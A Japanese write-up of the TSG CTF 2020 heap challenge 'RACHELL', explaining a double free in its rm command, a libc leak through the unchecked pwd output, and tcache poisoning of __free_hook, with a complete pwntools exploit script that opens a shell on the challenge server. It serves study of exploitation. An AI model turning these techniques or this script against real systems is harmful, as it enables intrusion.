---
tags: pwn
---

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

# TSG CTF 2020 - RACHELL

## Writeup

### Outline

シェルを模したプログラムでファイルに関係するコマンドはだいたい出来る
ファイルやディレクトリの作成時にnode構造体, 名前の為の領域が固定サイズのmallocで確保される。また、ファイルへの書き込みの際には可変サイズでmallocが起こり、ファイル内容のためのバッファが確保される
削除時にfreeが起こるが、ディレクトリの場合はnode構造体のみが、ファイルの場合は内容を書き込んだ場合はnodeに加えてバッファもfreeされる。
また、親ディレクトリからもunlinkされ、この際にポインタが削除されることから普通はDouble FreeやUAFは出来ない
のだが、別ディレクトリにあるファイルを削除する時に限り、ファイル内容のバッファを指すポインタが生き残る。以降も削除, 編集が出来るのでDouble Free, UAFになる
ここまで行くとHeap領域のコントロールが面倒なだけの問題であるが、肝心のshow機能が存在しない(catコマンドがあるが"実装してないよ"って言われる)
では、ファイル名やディレクトリ名のある領域にlibcのアドレスを出現させてそれをlsコマンドで読もうというのが考えられるがASCII文字列として無効なバイトが混じっていると即exitする
ではshowless leakということでstdoutやstderrをPartial Overwriteで弄って強引に出現させようとするが、全ての出力がwrite関数で行われており、そもそもstdout, stderrは使えない
最早絶望的だが実はpwdコマンドだけASCIIチェックが無い。これを利用してカレントディレクトリの文字列が入っているところにUnsorted Binの切り出しでlibcのアドレスを出現させる。
後はDouble Freeが普通にあるのでtcache poisoningでシェル起動アドレスを`__free_hook`に放り込む

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

* libc: 2.27
* 保持可能ポインタ: 特に制限無し
* malloc可能サイズ: コマンドによるがだいたい無制限
* コマンド: 沢山あるので後述

### definition

今回使う定数や構造体の定義は次の通り

```c
#define NAMELEN 0x20
#define MAXPATH_LEN 0x100
#define MAXCHILD 0x10
#define SYSBUF 0x5000

typedef enum{       // type of node
    DIR,            // directory
    FIL,            // file
} NTYPE;

struct node{
    NTYPE type;                 // node type 
    struct node *p;             // parent pointer
    struct node *c[MAXCHILD];   // child pointers
    char *name;                 // node name <= NAMELEN
    char *buf;                  // node content
    unsigned int size;          // node content size
};
```

### Commands

#### mkdir

mkdirコマンドが呼ばれるとディレクトリ名のチェック等を経てからmk関数が呼ばれる。重要な部分だけを抜粋すると次のようになっている

```c
  struct node *new = malloc(sizeof(struct node));
  new->name = malloc(NAMELEN+1); 
  strncpy(new->name,name,NAMELEN);
  new->name[strlen(name)] = '\x00';
  new->p = cwd;
  for(int ix=0;ix!=MAXCHILD;++ix)
      new->c[ix] = NULL;
  new->type = type;
  new->buf = NULL;
  new->size = 0;

  cwd->c[find_first_empty(cwd)] = new;
  return new;
```

node構造体を新しく作成し、名前用の領域も確保している。`type`には`DIR`が格納される

#### touch

mkdirコマンドのファイル版で、`type`に`FIL`が入るところ以外はだいたい同じ

#### rm

機能の大部分はrmコマンドのサブモジュールである`sub_rm`関数と`unlink_child`関数で行われている

```c
// Unlink a specified child from its parent.
void unlink_child(struct node *target)
{
  for(int ix=0;ix!=MAXCHILD;++ix){
    if(target->p->c[ix] == target){
      target->p->c[ix] = NULL;
      return;
    }
  }
  write(1,"unlink failed\n",14);
  panic();
}

// Submodule of rm().
void sub_rm(struct node *target)
{
  if(target == &root){
    write(1,"not allowed\n",12);
    return;
  }
  if(target->p == cwd){
    switch(target->type){
      case FIL:
        if(target->buf != NULL)
          free(target->buf);
        unlink_child(target);
        break;
      case DIR:
        unlink_child(target);
        free(target);
        break;
      default:
        panic();
    }
  }else{
    switch(target->type){
      case FIL:
        if(target->buf != NULL)
          // double free??
          free(target->buf);
        break;
      case DIR:
        unlink_child(target);
        free(target);
        break;
      default:
        panic();
    }
  }
}
```
コメントの`double free??`の部分に脆弱性がある(元からあったわけではなく私が追記したものです)
カレントディレクトリに無いファイルを相対パス指定で削除する際に`unlink_child(target)`が発生しない。よってfreeして以降もファイルが生き残っていることからDouble Freeが存在する。
更に後述するechoコマンドでUAF(write)も出来る

#### echo

echo自体は特に面白いことはない、重要なのはリダイレクトをする際に呼ばれる`write2file`関数である
これは指定したファイルのバッファにバイト列を書き込んでくれる
```c
// Write content at buffer of the specified node.
void write2file(struct node *target, const char *content, unsigned size)
{
  if(target->buf == NULL){
    target->buf = malloc(size);
    // find newline
    for(int ix=0; ix!=size; ++ix){
      if(content[ix] == '\r'){
        size = ix;
        break;
      }
    }
    memcpy(target->buf,content,size);
    target->size = size;
  }else{
    if(size > target->size){ // re-allocation
      free(target->buf);
      target->buf = malloc(size+1);
      // find newline
      for(int ix=0; ix!=size; ++ix){
        if(content[ix] == '\r'){
          size = ix;
          break;
        }
      }
      memcpy(target->buf,content,size);
      target->size = size;
    }else{                              // use same buffer
      memcpy(target->buf,content,size);
    }
  }
}
```

`target->buf`がnullなら新しく確保する。この際`arg> `というプロンプトが表示された後に`sysbuf`に書き込んだサイズだけmallocで要求される
`sysbuf`から`target->buf`への書き込み時には`\r`に遭遇するまで書き込まれる。
よって単にmallocだけをしたい時は先頭に`\r`を置いたバイト列を書き込むようにすればいい、但しnodeのsizeメンバは0になる

既に`target->buf`が存在する場合は書き込みたいサイズと`target->size`の大きさが比較され、前者の方が小さい場合は別のバッファが確保される。
そしてmemcpyで内容を書き込む

#### cd

カレントディレクトリを変える

#### pwd

カレントディレクトリを表示する。次で説明する`ascii_check`が唯一無い表示コマンドである

```c
// Check if the name consists only of allowed ASCII chars.
// Return 1 if the name contains only allowed ASCII chars.
// Return 0 otherwise.
// Allowed chars are [\n,-,@,0-9,a-z,A-Z,_,.]
unsigned char ascii_check(const char *name, unsigned int size)
{
    char c;
    for(int ix=0;ix!=size;++ix){
        c = name[ix];
        if(c=='\n' || c=='-' || (0x30<=c && c<=0x39) || (0x40<=c && c<=0x5a) || (0x61<=c && c<=0x7a) || c=='_' || c=='.')
            continue;
        return 0;
    }
    return 1;
}
```

これを見れば分かる通り、printableで無い文字列と大半の記号を弾いている。大半の表示系コマンドで使われており、これによって例えばファイル名のあるチャンクにlibc中のアドレスを降らせてlsコマンド(ここで解説していないがある)で読むことは叶わない(先頭から0x7fなので)。

#### cat

```c
// "cat" command.
// TODO: I have to implement it until the CTF. Otherwise, impossible to solve.
void cat(void)
{
  write(1,"not implemented\n",16);
}
```

はい

### libc leak

以上のコマンド群を利用してとりあえずlibc leakする、というかこれが出来れば9割クリアしたようなものである
方針としてはまともなshow機能が無いのでHeap Leakは諦め、UAF(write)を利用したPartial Overwriteでチャンクのサイズを一発でUnsorted Binに送ることが出来るように書き換える。
続いて下のチャンクを整えるついでに大きなチャンク内にどこかのディレクトリの名前が入るチャンクをオーバーラップさせる。
オーバーラップしたチャンクに入っている名前のディレクトリに移動し、Unsorted Binからの切り出しを発生させて名前の部分にmain_arenaのtopに相当するアドレスを出現させ、それをpwdコマンドで読んでlibc leakする

操作するポインタは出来るだけファイルの内容のバッファにする。自由な書き込みが出来る上にサイズも融通が効く。
下記コードで最初にnodeやname分のチャンクを作ってtcacheに放り込んでいるのはHeap上でファイルバッファが出来るだけ連続するようにしているからである。

まずはtcacheのリンクリストを書き換えてチャンクのサイズヘッダを書き換える。Heapのアドレスは当然知らないのでサイズの部分とデータが入る部分が0x10しか異ならないことを利用してPartial Overwriteをする。
これで`A -> B`だったリンクリストを`A -> B - 0x10`のようにし、echoコマンドでBのサイズをUnsorted Binに入るような大きさにする(今回は0x420)、またUnsorted Binに入れる際のチェックが無駄に走らないようにPREV_INUSEフラグは立てたままにする

この状態でBをfreeすればUnsorted Binに放り込まれようとするのだが、もちろん下のチャンクを整えていないのでabortする。というわけで再びファイルを作って偽装チャンクを作るようなechoコマンドを発生させる。
また、Unsorted Binの切り出しでlibc中のアドレスがカレントディレクトリの名前に降ってきて欲しいので大きくしたBのチャンクに中にあるディレクトリの名前が来るようにし、その上でそのディレクトリ上でコマンドを叩くようにする。
ここが1番大変で、というのも上手くtcacheを操作しないとカレントディレクトリの名前の上のチャンクがそのディレクトリのnodeになってしまい、下手に切り出したり下手にechoすることでカレントディレクトリのnodeが壊れてしまいSIGSEGVを連発する(しました)

結局最終的に次のような配置を強引に作ってからBをfreeした

```
00 00 00 00 00 00 00 00 | 21 04 00 00 00 00 00 00 <- サイズ
- 偽装されたチャンク B
|  ...
|  node構造体 X: 下のY->nameをmallocする前にfreeしてnode構造体 Yに生まれ変わる
|  X->name
|  Y-> name: node Y自体はXのを再利用
-  ...
Bのconsolidationを防ぐためのチャンク(偽装)
topチャンク
```

この状態でまた適当なファイルを作成し、サイズを上手いこと調整して`Y->name`にmain_arenaのtopに対応するアドレスが降ってくるようにする。
ここも鬼門でファイル作成時に必ず発生する固定サイズのmalloc(0xb0, 0x30のチャンクが作られる)が面倒なので適当にtcacheにこれらのサイズを退避させておいてUnsorted Binから切り出されないようにする。
そしてファイルのバッファ作成時にサイズを指定出来るのでここでカレントディレクトリの名前部分にアドレスを降らせる。
この際、node Yのデータが上書きされて死なないようにechoで`\r`を先頭に送り込んでmallocだけが行われるようにしておく

### いつもの

libc leakだけなのに長かった。
あとはrmで他のディレクトリにあるファイルを利用してDouble Free出来るのでtcache poisoningで`__free_hook`にシェル起動アドレスを放り込むだけである。
`"/bin/sh"`を叩き込むのが面倒だったので「お願い!!One Gadget!!」したら通った、良かった

## Code

```python
from pwn import p64, u64, ELF, process, remote


def command(s, cmd, c=b"command> "):
    s.recvuntil(c)
    s.sendline(cmd)


def mkdir(s, dir_name):
    command(s, b"mkdir")
    s.recvuntil(b"name> ")
    s.sendline(dir_name)


def cd(s, dir_name):
    command(s, b"cd")
    s.recvuntil(b"path> ")
    s.sendline(dir_name)


def touch(s, file_name):
    command(s, b"touch")
    s.recvuntil(b"filename> ")
    s.sendline(file_name)


def rm(s, file_name):
    command(s, b"rm")
    s.recvuntil(b"filename> ")
    s.sendline(file_name)


def echo(s, arg, file_name, redirect=False):
    command(s, b"echo")
    s.recvuntil(b"arg> ")
    s.sendline(arg)
    s.recvuntil(b"redirect?> ")
    if redirect:
        s.sendline("y")
        s.recvuntil(b"path> ")
        s.sendline(file_name)
    else:
        s.sendline("n")


def pwd(s, c=None):
    command(s, b"pwd")
    if c is not None:
        s.recvuntil(c)
    return s.recvline().rstrip()


def edit(s, idx, data, dir_name):
    echo(s, data, f"./{dir_name}/{idx}", True)


def delete(s, idx, dir_name):
    rm(s, f"./{dir_name}/{idx}")


def to_root(s):
    cd(s, "../")


if __name__ == "__main__":
    # s = process("./rachell")
    s = remote("35.221.81.216", 25252)
    libc = ELF("./libc.so.6")
    free_hook_libc = libc.symbols["__free_hook"]
    onegadgets = [0x4f2c5, 0x4f322, 0x10a38c]
    # ready 0xb0 (sizeof(node)) and 0x30 (sizeof(node->name))
    for i in range(7):
        mkdir(s, "d" + str(i))
        touch(s, "f" + str(i))
        echo(s, "a" * 0x28, "f" + str(i), True)

    for i in range(1, 7):
        rm(s, f"./f{i}")
        rm(s, f"./d{i}")

    d = "size"
    mkdir(s, d)
    cd(s, d)

    touch(s, "0")
    touch(s, "1")
    echo(s, "\x00" * 0x38, "./0", True)
    echo(s, "\x00" * 0x38, "./1", True)

    to_root(s)

    delete(s, 1, d)
    delete(s, 0, d)

    edit(s, 0, b"\x20", d)

    touch(s, "10")
    touch(s, "11")
    echo(s, "\x00" * 0x38, "./10", True)
    echo(s, "\x00" * 0x38, "./11", True)
    size = 0x420
    echo(s, p64(0x30) + p64(size + 1), "./11", True)

    cd(s, d)
    touch(s, "fake")
    mkdir(s, "junk")
    rm(s, "./junk")
    mkdir(s, "pwd")
    cd(s, "pwd")
    fake_chunk = b"a" * (0x410 - 0x40 - 0xb0 - 0x30 * 2) + p64(0x420) + p64(0x21) + b"a" * 0x18
    echo(s, fake_chunk, "../fake", True)

    rm(s, "../1")

    rm(s, "../../f0")
    rm(s, "../../home")

    touch(s, "unsort")
    # s.interactive()

    cut_size = 0xb0 + 0x30 * 2 + 0x10 - 0x8
    echo(s, "\r" * cut_size, "./unsort", True)

    libc_addr = u64(pwd(s, b"/size/").ljust(8, b"\x00")) - 0x3ebca0
    print(hex(libc_addr))

    to_root(s)
    to_root(s)

    mkdir(s, "double")
    cd(s, "double")
    touch(s, "free")
    echo(s, "\r" * 0x18, "free", True)
    to_root(s)
    delete(s, "free", "double")
    delete(s, "free", "double")

    touch(s, "poison1")
    echo(s, p64(libc_addr + free_hook_libc), "poison1", True)
    touch(s, "poison2")
    echo(s, "\r" * 0x18, "poison2", True)
    touch(s, "poison3")
    echo(s, p64(libc_addr + onegadgets[1]), "poison3", True)

    rm(s, "./poison2")
    s.interactive()

```

## Flag

当日は解けませんでしたが、まだ鯖が生きていたので解きました

`TSGCTF{beer_is_delicious_if_you_dont_taste_it_6592867821310}`

## 感想

想定解がHouse of Corrosionなところまでは当日わかりましたが(show機能が貧弱過ぎるので)、理解と実装が追いつかなくて当日解けませんでした。
そういうわけで、pwdにASCIIチェックが無いことを利用した非想定解の方で解きましたがこちらもかなり大変でした
create時に2つのmallocが走る上に自由な書き込みが出来るmallocは更にもう一段階欲しいせいでHeapの構造がｸﾞｯｯｯｯｯｯﾁｬｸﾞﾁｬになって発狂してました(実際昨日はそのせいでやる気が死滅した)

TSGCTF 2020で自分が触った問題の復習が無事に終わったので次からはまた別の問題探しに勤しみます。2.23の環境が無事に用意できたので最新の問題の内2.23で動いているものをやろうかと思っています

また、今回のようにn択のHeap問題ではなく、汎用的なプログラムとHeapの対応を見つけて解くような難しめの問題も探して挑んでみたいです、良問情報がありましたらよろしくお願いします